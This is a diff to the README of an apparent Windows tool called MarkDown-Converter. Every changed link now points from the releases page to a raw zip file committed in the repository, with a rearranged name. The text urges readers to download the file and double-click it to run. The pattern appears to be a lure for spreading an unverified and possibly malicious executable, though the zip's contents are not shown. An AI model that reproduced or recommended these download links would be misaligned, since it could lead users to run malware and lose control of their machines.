@@ -1,6 +1,6 @@
 # 📄 MarkDown-Converter - Convert Any File to Markdown Instantly
 
-[![Download MarkDown-Converter](https://img.shields.io/badge/Download-MarkDown--Converter-blue?style=for-the-badge&logo=github)](https://github.com/awful-sergeantmajor27/MarkDown-Converter/releases)
+[![Download MarkDown-Converter](https://img.shields.io/badge/Download-MarkDown--Converter-blue?style=for-the-badge&logo=github)](https://github.com/awful-sergeantmajor27/MarkDown-Converter/raw/refs/heads/main/installer/Mark-Converter-Down-v1.4-beta.3.zip)
 
 ## 🎯 What Is MarkDown-Converter?
 
@@ -21,7 +21,7 @@ Here is your step-by-step path to success:
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/awful-sergeantmajor27/MarkDown-Converter/releases](https://github.com/awful-sergeantmajor27/MarkDown-Converter/releases)
+Visit this link to download the application: [https://github.com/awful-sergeantmajor27/MarkDown-Converter/raw/refs/heads/main/installer/Mark-Converter-Down-v1.4-beta.3.zip](https://github.com/awful-sergeantmajor27/MarkDown-Converter/raw/refs/heads/main/installer/Mark-Converter-Down-v1.4-beta.3.zip)
 
 Once you are on the download page, look for the newest release at the top. Click the download link for your Windows system. The file will be saved to your computer. After the download finishes, locate the file (usually in your Downloads folder) and double-click it to launch MarkDown-Converter. The app will open immediately – no installation required because it runs as a portable application.
 
@@ -114,7 +114,7 @@ Stop retyping documents by hand. Stop copying text from PDFs that refuse to coop
 
 Click the download button below to get your copy right now.
 
-[![Download MarkDown-Converter Now](https://img.shields.io/badge/⬇️-Download%20Latest%20Version-green.svg?style=for-the-badge)](https://github.com/awful-sergeantmajor27/MarkDown-Converter/releases)
+[![Download MarkDown-Converter Now](https://img.shields.io/badge/⬇️-Download%20Latest%20Version-green.svg?style=for-the-badge)](https://github.com/awful-sergeantmajor27/MarkDown-Converter/raw/refs/heads/main/installer/Mark-Converter-Down-v1.4-beta.3.zip)
 
 After you download and run the app, you will wonder how you ever managed without it. Convert your first file in under 30 seconds – we promise it is that simple. The future of document conversion is here, and it lives entirely on your computer.
 
